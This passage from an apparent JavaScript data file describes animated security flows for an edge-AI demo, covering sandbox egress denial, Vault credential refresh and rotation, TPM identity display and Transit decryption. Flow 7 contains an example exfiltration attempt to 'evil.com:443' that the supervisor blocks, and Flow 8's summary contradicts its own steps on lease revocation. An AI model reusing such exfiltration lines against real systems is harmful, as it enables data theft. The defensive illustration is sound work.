        edgeLabel: 'POST (real key injected)',
        label: 'POST /events  X-Edge-Key: <real key injected>  (sandbox never sees it)',
        narration: 'The supervisor resolves the placeholder, injects the real INGEST_KEY into the header, and forwards the request to trusted-edge. The sandbox process never learns the real key.',
        evidence: 'verified',
      },
      {
        // Step 3: TE validates (in-process, no network)
        archNodes: ['TE'], archEdges: [],
        from:'TE', to:'TE', arrow:'note',
        label: 'validate event_type allow-list · body size cap · rate limit',
        narration: 'trusted-edge validates the event: checks event_type against the allow-list, enforces body size cap, and applies rate limiting.',
        evidence: 'verified',
      },
      {
        // Step 4: TE encrypts (in-process, no network)
        archNodes: ['TE'], archEdges: [],
        from:'TE', to:'TE', arrow:'note',
        label: 'AES-256-GCM encrypt(raw_payload, DEK) → base64(nonce‖ciphertext)',
        narration: 'The payload is encrypted in-memory with the Transit datakey. The ciphertext and the Transit-wrapped DEK are what gets stored — no plaintext.',
        evidence: 'verified',
      },
      {
        // Step 5: TE → DB: INSERT ciphertext
        archNodes: ['TE','PG'], archEdges: ['e-te-pg'],
        packetEdge: 'e-te-pg',
        from:'TE', to:'DB', arrow:'solid',
        edgeLabel: 'INSERT (ciphertext only)',
        label: 'INSERT INTO events (raw_payload=AES-GCM, encrypted_datakey="vault:v1:…")',
        note: 'No plaintext on disk. encrypted_datakey = Transit-wrapped DEK. raw_payload = AES-GCM ciphertext.',
        narration: 'Only the AES-GCM ciphertext and the Transit-wrapped DEK are written to PostgreSQL. No plaintext event data is ever stored.',
        evidence: 'verified',
      },
      {
        // Step 6: DB → TE: INSERT OK
        archNodes: ['TE','PG'], archEdges: ['e-te-pg'],
        packetEdge: 'e-te-pg', packetReverse: true,
        from:'DB', to:'TE', arrow:'dashed',
        edgeLabel: 'INSERT (ciphertext only)',
        label: 'INSERT OK — row id returned',
        narration: 'PostgreSQL confirms the row was written. trusted-edge now has the row id to include in the 201 response.',
        evidence: 'verified',
      },
      {
        // Step 7: TE → SUP: 201 Created
        archNodes: ['TE','SUP'], archEdges: ['e-sup-te'],
        packetEdge: 'e-sup-te', packetReverse: true,
        from:'TE', to:'SUP', arrow:'dashed',
        edgeLabel: '201 Created response',
        label: '201 Created — row id',
        narration: 'trusted-edge returns 201 to the supervisor.',
        evidence: 'verified',
      },
      {
        // Step 8: SUP → AG: 201 forwarded to sandbox
        archNodes: ['SUP','AG'], archEdges: ['e-ag-sup'],
        packetEdge: 'e-ag-sup', packetReverse: true,
        from:'SUP', to:'AG', arrow:'dashed',
        label: '201 Created forwarded to sandbox',
        narration: 'The supervisor forwards the 201 into the sandbox. The event write is complete — the agent confirms success, but has never seen the plaintext key or the DB credential.',
        evidence: 'verified',
      },
    ],
  },

  // ── Flow 7 ─────────────────────────────────────────────────────────────────
  {
    id: 'f7',
    title: '7. Sandbox Egress Deny',
    shortTitle: '7. Egress Deny',
    evidence: 'verified', evidenceRef: '3-4b, 3-5i',
    description: 'Compromised code inside the sandbox cannot exfiltrate data — the sandbox runs with network_mode=none, meaning it has no network interface at all. Every connection attempt must go through the OpenShell supervisor, which maintains a default-deny policy and allows only the two explicitly whitelisted endpoints. Any other destination — including cloud services, attacker infrastructure, or internal network hosts — is blocked and logged as a DENIED audit event.',
    attackerGets: 'No exfiltration path from inside the sandbox. All egress blocked by default. Log: NET:OPEN [MED] DENIED … transparent_tcp_policy_denied.',
    participants: ['Attacker', 'AG', 'SUP'],
    subSteps: [
      {
        // Step 1: compromised code attempts outbound connection — Attacker→AG.
        // e-threat-ag is a dedicated THREAT→AG edge so the packet visually goes
        // from the Attacker node into agent.py. Outcome not yet known, no denied flag.
        archNodes: ['THREAT','AG'], archEdges: ['e-threat-ag'],
        packetEdge: 'e-threat-ag',
        from:'Attacker', to:'AG', arrow:'solid',
        label: 'connect("evil.com:443")  — compromised code inside sandbox',
        narration: 'Compromised code inside the sandbox attempts to connect to an arbitrary host. All sandbox network egress goes through the OpenShell supervisor.',
        evidence: 'verified',
      },
      {
        // Step 2: request travels to supervisor — normal blue arrow, still no verdict yet
        archNodes: ['AG','SUP'], archEdges: ['e-ag-sup'],
        packetEdge: 'e-ag-sup',
        from:'AG', to:'SUP', arrow:'solid',
        label: 'only path out of sandbox (network_mode=none)',
        narration: 'The sandbox has network_mode=none — no direct network interface. All connections must pass through the supervisor.',
        evidence: 'verified',
      },
      {
        // Step 3: supervisor evaluates policy — in-process note, no verdict delivered yet
        archNodes: ['SUP'], archEdges: [],
        from:'SUP', to:'SUP', arrow:'note',
        label: 'no matching network_policies rule → default deny',
        note: 'openshell logs: NET:OPEN [MED] DENIED … [reason:transparent_tcp_policy_denied]',
        narration: 'The supervisor finds no matching rule for evil.com:443. Default policy is deny. The connection is blocked at the supervisor — no packet reaches the internet.',
        evidence: 'verified',
      },
      {
        // Step 4: DENIED — red dashed SUP→AG in sequence; X packet reversed on e-ag-sup in arch.
        // archEdges:['e-ag-sup'] so the arch panel highlights the sandbox↔supervisor boundary,
        // not the THREAT→SUP edge (which would confuse the viewer about arrow direction).
        archNodes: ['SUP','AG'], archEdges: ['e-ag-sup'],
        packetEdge: 'e-ag-sup', packetReverse: true, denied: true,
        from:'SUP', to:'AG', arrow:'dashed',
        label: 'Errno 13 EACCES — connection refused by supervisor',
        narration: 'The sandbox process receives Errno 13 EACCES. No exfiltration occurred.',
        evidence: 'verified',
      },
    ],
  },

  // ── Flow 8 ─────────────────────────────────────────────────────────────────
  {
    id: 'f8',
    title: '8. Automatic DB Credential Refresh',
    shortTitle: '8. Auto Refresh',
    evidence: 'verified', evidenceRef: '5-2',
    description: 'Dynamic database credentials expire after 5 minutes. trusted-edge automatically fetches a fresh credential before expiry, so INSERTs never pause. Vault provisions a new PostgreSQL role on each renewal — meaning the credential in use at any point in time is never older than 5 minutes. This severely limits the value of any stolen credential: by the time an attacker could use it, it has likely already expired.',
    attackerGets: 'Old lease not immediately revoked on auto-refresh (T-03). Accepted demo trade-off; production fix: explicit lease revoke on refresh.',
    participants: ['TE', 'V', 'DB'],
    subSteps: [
      {
        // Step 1: TE → Vault: request new credential
        archNodes: ['TE','VAULT'], archEdges: ['e-te-vault'],
        packetEdge: 'e-te-vault',
        from:'TE', to:'V', arrow:'solid',
        edgeLabel: 'DB engine: new credential',
        label: 'GET edge-ai-demo-database/creds/edge-camera-agent  (near TTL expiry)',
        narration: 'Before the 5-minute DB credential expires, trusted-edge automatically requests a new one. INSERTs continue uninterrupted during the refresh.',
        evidence: 'verified',
      },
      {
        // Step 2: Vault → DB: CREATE ROLE
        archNodes: ['VAULT','PG'], archEdges: ['e-vault-pg'],
        packetEdge: 'e-vault-pg',
        from:'V', to:'DB', arrow:'solid',
        label: 'CREATE ROLE (new, +5 min TTL)',
        narration: 'Vault creates a new PostgreSQL role. The old role is revoked in a later step, once the new credential has been swapped in.',
        evidence: 'verified',
      },
      {
        // Step 3: DB → Vault: CREATE ROLE OK
        archNodes: ['VAULT','PG'], archEdges: ['e-vault-pg'],
        packetEdge: 'e-vault-pg', packetReverse: true,
        from:'DB', to:'V', arrow:'dashed',
        label: 'CREATE ROLE OK',
        narration: 'PostgreSQL confirms the new role was created. Vault now has the lease to return to trusted-edge.',
        evidence: 'verified',
      },
      {
        // Step 4: Vault → TE: return new credential
        archNodes: ['TE','VAULT'], archEdges: ['e-te-vault'],
        packetEdge: 'e-te-vault', packetReverse: true,
        from:'V', to:'TE', arrow:'dashed',
        edgeLabel: 'DB engine: new credential',
        label: '{ username, password, lease_id } — replaces old in memory',
        note: 'After the swap, trusted-edge revokes the previous lease unless it has already expired (otherwise Vault drops the role at its TTL).',
        narration: 'The new credential replaces the old in trusted-edge memory, and trusted-edge then revokes the old lease so the old PostgreSQL role is dropped.',
        evidence: 'verified',
      },
    ],
  },

  // ── Flow 9 ─────────────────────────────────────────────────────────────────
  {
    id: 'f9',
    title: '9. Rotate Secret Now',
    shortTitle: '9. Rotate Secret',
    evidence: 'verified', evidenceRef: '5-3b run 2',
    description: 'The operator can trigger an immediate credential rotation from the WebUI — no SSH, no restarts. trusted-edge fetches a new PostgreSQL credential from Vault, atomically swaps the pointer under an INSERT lock (measured rotation window: 30–53 ms), then explicitly revokes the old lease. The old PostgreSQL role is dropped and any active sessions using it are terminated. Event writes continue uninterrupted throughout the rotation.',
    attackerGets: 'Rotate window measured 30–53 ms (*verified* 5-3b). Admin route unauthenticated on LAN (T-32).',
    participants: ['UI', 'TE', 'V', 'DB'],
    subSteps: [
      {
        // Step 1: UI → TE: trigger rotation
        archNodes: ['UI','TE'], archEdges: ['e-ui-te'],
        packetEdge: 'e-ui-te',
        from:'UI', to:'TE', arrow:'solid',
        label: 'POST /admin/rotate-credential  X-Admin-Key  (plain HTTP — T-32)',
        narration: 'The WebUI operator clicks "Rotate Secret Now". The WebUI calls trusted-edge with the admin key (delivered via LoadCredential=, not the ingest key).',
        evidence: 'verified',
      },
      {
        // Step 2: TE → Vault: request new DB credential
        archNodes: ['TE','VAULT'], archEdges: ['e-te-vault'],
        packetEdge: 'e-te-vault',
        from:'TE', to:'V', arrow:'solid',
        edgeLabel: 'DB engine: new credential',
        label: 'GET edge-ai-demo-database/creds/edge-camera-agent  (INSERT lock NOT held)',
        narration: 'trusted-edge fetches a new DB credential from Vault. INSERTs are not locked during this fetch — only during the pointer swap.',
        evidence: 'verified',
      },
      {
        // Step 3: Vault → DB: CREATE ROLE
        archNodes: ['VAULT','PG'], archEdges: ['e-vault-pg'],
        packetEdge: 'e-vault-pg',
        from:'V', to:'DB', arrow:'solid',
        label: 'CREATE ROLE (new, +5 min TTL)',
        narration: 'Vault connects to PostgreSQL and creates the new dynamic role.',
        evidence: 'verified',
      },
      {
        // Step 4: DB → Vault: CREATE ROLE OK
        archNodes: ['VAULT','PG'], archEdges: ['e-vault-pg'],
        packetEdge: 'e-vault-pg', packetReverse: true,
        from:'DB', to:'V', arrow:'dashed',
        label: 'CREATE ROLE OK',
        narration: 'PostgreSQL confirms the new role was created. Vault now has a valid lease to return.',
        evidence: 'verified',
      },
      {
        // Step 5: Vault → TE: return new credential
        archNodes: ['TE','VAULT'], archEdges: ['e-te-vault'],
        packetEdge: 'e-te-vault', packetReverse: true,
        from:'V', to:'TE', arrow:'dashed',
        edgeLabel: 'DB engine: new credential',
        label: '{ new username, new password, new lease_id } — held in process memory only',
        narration: 'Vault returns the new credential. trusted-edge holds it in memory — it will swap it in under the INSERT lock in the next step.',
        evidence: 'verified',
      },
      {
        // Step 6: TE in-process: atomic pointer swap
        archNodes: ['TE'], archEdges: [],
        from:'TE', to:'TE', arrow:'note',
        label: 'swap credential pointer under INSERT lock — INSERTs continue',
        note: 'Rotation window: 30–53 ms measured (*verified* 5-3b). 2 rows inserted during the window, 0 paused.',
        narration: 'The pointer to the active credential is atomically swapped under the INSERT lock. INSERTs are not paused — they use the old credential up to the swap, the new credential after.',
        evidence: 'verified',
      },
      {
        // Step 7: TE → Vault: revoke old lease
        archNodes: ['TE','VAULT'], archEdges: ['e-te-vault'],
        packetEdge: 'e-te-vault',
        from:'TE', to:'V', arrow:'solid',
        edgeLabel: 'sys/leases: revoke old lease',
        label: 'POST sys/leases/revoke/<old lease_id>  (policy-limited to this role)',
        narration: 'trusted-edge immediately revokes the old lease. The edge policy allows lease revocation only for this specific DB role\'s leases.',
        evidence: 'verified',
      },
      {
        // Step 8: Vault → DB: DROP ROLE old
        archNodes: ['VAULT','PG'], archEdges: ['e-vault-pg'],
        packetEdge: 'e-vault-pg',
        from:'V', to:'DB', arrow:'solid',
        label: 'DROP ROLE old  (pg_terminate_backend)',
        narration: 'Vault drops the old PostgreSQL role and terminates any active sessions using it.',
        evidence: 'verified',
      },
      {
        // Step 9: DB → Vault: DROP ROLE OK
        archNodes: ['VAULT','PG'], archEdges: ['e-vault-pg'],
        packetEdge: 'e-vault-pg', packetReverse: true,
        from:'DB', to:'V', arrow:'dashed',
        label: 'DROP ROLE OK',
        narration: 'PostgreSQL confirms the old role is gone and its sessions are terminated.',
        evidence: 'verified',
      },
      {
        // Step 10: Vault → TE: revoke acknowledged (204, empty body)
        archNodes: ['TE','VAULT'], archEdges: ['e-te-vault'],
        packetEdge: 'e-te-vault', packetReverse: true,
        from:'V', to:'TE', arrow:'dashed',
        edgeLabel: 'sys/leases: revoke old lease',
        label: '204 No Content — old lease revoked',
        narration: 'Vault answers the revoke call with 204 and an empty body. The old credential is now invalid in Vault and in PostgreSQL.',
        evidence: 'verified',
      },
      {
        // Step 11: TE → UI: rotation summary
        archNodes: ['TE','UI'], archEdges: ['e-ui-te'],
        packetEdge: 'e-ui-te', packetReverse: true,
        from:'TE', to:'UI', arrow:'dashed',
        label: '{ old_username, new_username, old_lease_revoked: true, rows_before/after_swap }',
        note: 'The password never leaves trusted-edge.',
        narration: 'trusted-edge returns the rotation summary. The new password is never sent — only the new username, revocation status, and row counts.',
        evidence: 'verified',
      },
    ],
  },

  // ── Flow 10 ────────────────────────────────────────────────────────────────
  {
    id: 'f10',
    title: '10. Hardware-Rooted Identity Strip',
    shortTitle: '10. Identity Strip',
    evidence: 'verified', evidenceRef: '5-3b run 2',
    description: 'The identity strip on the Security Audit tab answers the question: what hardware-rooted identity is this device currently running as? The WebUI polls two Vault token lookups — one via trusted-edge for the edge token, one directly for the gateway token — and displays only whitelisted fields: display name, policies, TTL, and expiry. The token id and accessor are always stripped, so the browser cannot be used to impersonate either service. The display names (tpm-edge-camera-agent, tpm-openshell-gateway) prove the tokens were issued via TPM attestation, not a static credential.',
    attackerGets: 'Token id/accessor never returned to browser. WebUI is unauthenticated on LAN (T-31) — anyone on the LAN can see token TTL and policies.',
    participants: ['UI', 'TE', 'V'],
    subSteps: [
      {
        archNodes: ['UI','TE'], archEdges: ['e-ui-te'],
        from:'UI', to:'TE', arrow:'solid',
        label: 'GET /admin/identity  X-Admin-Key',
        narration: 'The WebUI polls /admin/identity every 30 seconds to show the hardware-rooted token identity strip.',
        evidence: 'verified',
      },
      {
        archNodes: ['TE','VAULT'], archEdges: ['e-te-vault'],
        from:'TE', to:'V', arrow:'solid',
        edgeLabel: 'token lookup-self (edge token)',
        label: 'GET auth/token/lookup-self  (edge token)',
        narration: 'trusted-edge calls Vault auth/token/lookup-self with its own edge token. This is HTTPS — no token appears in a process argument list.',
        evidence: 'verified',
      },
      {
        archNodes: ['TE','VAULT'], archEdges: ['e-te-vault'],
        packetEdge: 'e-te-vault', packetReverse: true,
        from:'V', to:'TE', arrow:'dashed',
        edgeLabel: 'token lookup-self (edge token)',
        label: 'display_name, policies, ttl, expire_time',
        narration: 'Vault returns the edge token\'s identity. The response also contains the token id and accessor — trusted-edge drops them in the next step.',
        evidence: 'verified',
      },
      {
        archNodes: ['TE','UI'], archEdges: ['e-ui-te'],
        packetEdge: 'e-ui-te', packetReverse: true,
        from:'TE', to:'UI', arrow:'dashed',
        label: 'whitelisted fields only: display_name, policies, ttl, expire_time, path  (no token id/accessor)',
        narration: 'trusted-edge returns only the whitelisted fields. The token id and accessor are stripped — they cannot be used to impersonate.',
        evidence: 'verified',
      },
      {
        archNodes: ['UI'], archEdges: [],
        from:'UI', to:'UI', arrow:'note',
        label: 'read /run/openshell/vault-token (local tmpfs — WebUI runs as jetson user)',
        narration: 'The WebUI reads the gateway token file directly from tmpfs. The file is readable because live-vlm-webui.service runs as the jetson user.',
        evidence: 'verified',
      },
      {
        archNodes: ['UI','VAULT'], archEdges: ['e-ui-vault'],
        from:'UI', to:'V', arrow:'solid',
        edgeLabel: 'token lookup-self (gateway token)',
        label: 'GET auth/token/lookup-self  (gateway token, HTTPS TLS-pinned to tls/vault.crt)',
        narration: 'The WebUI calls Vault lookup-self with the gateway token directly. TLS is pinned to the self-signed certificate.',
        evidence: 'verified',
      },
      {
        archNodes: ['UI','VAULT'], archEdges: ['e-ui-vault'],
        packetEdge: 'e-ui-vault', packetReverse: true,
        from:'V', to:'UI', arrow:'dashed',
        edgeLabel: 'token lookup-self (gateway token)',
        label: 'display_name: tpm-openshell-gateway, policies, ttl, expire_time',
        narration: 'Vault returns the gateway token\'s identity. Both strips (edge + gateway) are now shown in the Security Audit identity strip.',
        evidence: 'verified',
      },
    ],
  },

  // ── Flow 11 ────────────────────────────────────────────────────────────────
  {
    id: 'f11',
    title: '11. Payload Decryption Toggle',
    shortTitle: '11. Decrypt Toggle',
    evidence: 'verified', evidenceRef: '5-3b run 2',
    description: 'Pressing "Decrypt stored events" in the WebUI triggers a minimal-privilege decryption path: the WebUI server logs in to Vault as a dedicated control-plane-reader AppRole that can only call Transit decrypt — nothing else. The encrypted rows are fetched from trusted-edge, the Transit-wrapped datakey is decrypted by Vault, and the AES-256-GCM payload is decrypted inside the WebUI server process; only the resulting text is sent to the browser. At no point does PostgreSQL serve plaintext, and the decryption key is kept only for the duration of each request. The control-plane-reader token gets 403 on every other Vault operation.',
    attackerGets: 'control-plane-reader token is short-lived. Gets 403 on encrypt, datakey, KV, DB creds. Decrypt call unauthenticated on LAN (T-31).',
    participants: ['UI', 'TE', 'V', 'DB'],
    subSteps: [
      {
        archNodes: ['UI','TE'], archEdges: ['e-ui-te'],
        from:'UI', to:'TE', arrow:'solid',
        label: 'GET /admin/events?limit=N  X-Admin-Key — CIPHERTEXT rows only',
        narration: 'The WebUI requests encrypted event rows from trusted-edge. trusted-edge never returns plaintext — only the AES-GCM ciphertext and the Transit-wrapped DEK.',
        evidence: 'verified',
      },
      {
        archNodes: ['TE','PG'], archEdges: ['e-te-pg'],
        packetEdge: 'e-te-pg',
        from:'TE', to:'DB', arrow:'solid',
        edgeLabel: 'SELECT (read ciphertext)',
        label: 'SELECT raw_payload, encrypted_datakey FROM events LIMIT N',
        narration: 'trusted-edge queries PostgreSQL. Both columns are ciphertext — no plaintext is retrieved from the database.',
        evidence: 'verified',
      },
      {
        archNodes: ['TE','PG'], archEdges: ['e-te-pg'],
        packetReverse: true, packetEdge: 'e-te-pg',
        from:'DB', to:'TE', arrow:'dashed',
        edgeLabel: 'SELECT (read ciphertext)',
        label: 'N rows (encrypted_datakey + AES-GCM raw_payload)',
        narration: 'PostgreSQL returns the encrypted rows. No plaintext is in the result — both columns are ciphertext.',
        evidence: 'verified',
      },
      {
        archNodes: ['TE','UI'], archEdges: ['e-ui-te'],
        packetEdge: 'e-ui-te', packetReverse: true,
        from:'TE', to:'UI', arrow:'dashed',
        label: 'ciphertext rows (raw_payload + encrypted_datakey)',
        narration: 'trusted-edge hands the ciphertext rows back to the WebUI. Nothing it returns can be read without a Vault decrypt call.',
        evidence: 'verified',
      },
      {
        archNodes: ['UI'], archEdges: [],
        from:'UI', to:'UI', arrow:'note',
        label: 'read role_id + secret_id from $CREDENTIALS_DIRECTORY/control-reader',
        note: 'Set up once from the Mac and copied to /etc/webui-vault/control-reader (root-only). systemd hands it to the WebUI. AppRole is the alternative for apps without a TPM: a static secret with no expiry, not hardware-rooted like the vault-agent tokens (T-30).',
        narration: 'The edge and gateway tokens cannot decrypt on purpose, so decryption has its own identity. Its login secret was created on the Mac, copied to the device as a root-only file, and handed to the WebUI by systemd. This is the Vault AppRole method, the option for software that has no TPM; unlike the vault-agent tokens it is not issued through TPM attestation.',
        evidence: 'verified',
      },
      {
        archNodes: ['UI','VAULT'], archEdges: ['e-ui-vault'],
        packetEdge: 'e-ui-vault',
        from:'UI', to:'V', arrow:'solid',
        edgeLabel: 'AppRole login (reader role)',
        label: 'POST auth/approle/login  role_id + secret_id (from LoadCredential=)',
        narration: 'The WebUI logs in to Vault as the control-plane-reader AppRole using the secret from the previous step.',
        evidence: 'verified',
      },
      {
        archNodes: ['UI','VAULT'], archEdges: ['e-ui-vault'],
        packetEdge: 'e-ui-vault', packetReverse: true,
        from:'V', to:'UI', arrow:'dashed',
        edgeLabel: 'AppRole login (reader role)',
        label: 'short-lived token (policy: Transit decrypt/edge-telemetry ONLY)',
        note: 'This token gets 403 on encrypt, datakey/plaintext, rewrap, KV camera-creds, DB creds, and lookup-self.',
        narration: 'Vault returns a short-lived token with ONLY Transit decrypt permission. Every other Vault operation returns 403.',
        evidence: 'verified',
      },
      {
        archNodes: ['UI','VAULT'], archEdges: ['e-ui-vault'],
        packetEdge: 'e-ui-vault',
        from:'UI', to:'V', arrow:'solid',
        edgeLabel: 'Transit: decrypt datakey',
        label: 'POST edge-ai-demo-encryption-transit/decrypt/edge-telemetry  (encrypted_datakey)',
        narration: 'The WebUI sends the Transit-wrapped DEK to Vault for decryption.',
        evidence: 'verified',
      },
      {
        archNodes: ['UI','VAULT'], archEdges: ['e-ui-vault'],
        packetEdge: 'e-ui-vault', packetReverse: true,
        from:'V', to:'UI', arrow:'dashed',
        edgeLabel: 'Transit: decrypt datakey',
        label: 'DEK (request-local, never cached or logged)',
        narration: 'Vault returns the plaintext DEK to the WebUI server process. It lives only as a local variable for this one request.',
        evidence: 'verified',
      },
      {
        archNodes: ['UI'], archEdges: [],
        from:'UI', to:'UI', arrow:'note',
        label: 'AES-256-GCM decrypt raw_payload in-process using DEK → plaintext to browser',
        note: 'DEK is request-local. The browser never contacts PostgreSQL directly.',
        narration: 'The WebUI server decrypts the payload in-process using the DEK and sends only the plaintext sentence to the browser. The DEK is discarded after the request.',
        evidence: 'verified',
      },
    ],
  },

];
